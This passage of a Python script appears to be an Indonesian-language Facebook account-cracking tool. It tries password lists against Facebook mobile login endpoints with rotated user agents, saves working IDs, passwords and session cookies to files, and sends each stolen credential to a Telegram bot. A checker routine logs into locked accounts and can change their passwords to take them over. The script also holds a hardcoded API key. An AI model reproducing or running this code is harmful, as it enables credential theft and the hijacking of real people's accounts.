				statuscp = f''' BAD ACCOUNT[üÖ±]  |ùêÅ ùêó ùêÑ|\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nID: {idf}\nPASSWERD : {pw}\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nPY: ìäàùêÅùêóùêÑìäâ~@H_S_W_M		'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='SESI'))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				print('\n')
				statusok = f''' GOOD ACCOUNT[‚úÖ]  |ùêÅ ùêó ùêÑ|\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nID: {idf}\nPASSWERD : {pw}\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nPY: ìäàùêÅùêóùêÑìäâ~@H_S_W_M		'''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title=' NO SESI'))
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def crackmobile(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{loop}:{len(id)}   \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				statuscp = f'''BAD ACCOUNT[üÖ±]  |ùêÅ ùêó ùêÑ|\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nID: {idf}\nPASSWERD : {pw}\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nPY: ìäàùêÅùêóùêÑìäâ~@H_S_W_M		'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='SESI'))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				print('\n')
				statusok = f'''GOOD ACCOUNT[‚úÖ]  |ùêÅ ùêó ùêÑ|\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nID: {idf}\nPASSWERD : {pw}\níÖí‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‡ºíùêÅ ùêó ùêÑ‡ºí‚îÅ‚îÄ‚îÄ‚îÄ‚îÄíÖí\nPY: ìäàùêÅùêóùêÑìäâ~@H_S_W_M		'''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title=' NO SESI'))
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
				
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1


def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s [%s\x1b[1;91m\x1b[1;91mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\x1b[1;91m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s %s %s"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s %s%s"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s %s"%(M,oh))
	else:
		print("%s \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
        




# --> Modules
import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu
def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\nProgram Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\nProgram Selesai Dalam Waktu 0 Detik\n')

# --> Main Program
class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input('Masukkan URL : ')
        print('\n[1] Source Payload')
        print('[2] Parsed Payload')
        print('[3] Source Code Post Requests')
        self.tanya = input('Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)

    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        # --> Tampil Get Requests
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print("cookie = requests.Session().cookies.get_dict()")
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	Login() 
